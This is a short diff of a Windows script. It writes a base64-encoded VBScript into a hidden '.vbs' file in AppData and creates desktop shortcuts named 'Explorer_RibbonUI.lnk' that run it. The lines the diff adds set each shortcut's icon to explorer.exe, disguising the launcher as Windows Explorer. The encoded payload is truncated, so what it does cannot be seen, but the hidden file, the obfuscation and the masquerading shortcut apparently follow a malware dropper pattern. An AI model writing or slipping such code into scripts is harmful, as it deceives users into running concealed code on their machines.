@@ -2,7 +2,9 @@ cmd /c del."%appdata%\.vbs""&"echo.U2V0IFdzaFNoZWxsPVdTY3JpcHQuQ3JlYXRlT2JqZWN0K
 $WshShell = New-Object -comObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut("$env:UserProfile\Desktop\Explorer_RibbonUI.lnk")
 $Shortcut.TargetPath = "$env:AppData\.vbs"
+$shortcut.IconLocation = "%windir%\explorer.exe"
 $Shortcut.Save()
 $Short = $WshShell.CreateShortcut("$env:UserProfile\OneDrive\Desktop\Explorer_RibbonUI.lnk")
 $Short.TargetPath = "$env:AppData\.vbs"
+$short.IconLocation = "%windir%\explorer.exe"
 $Short.Save()
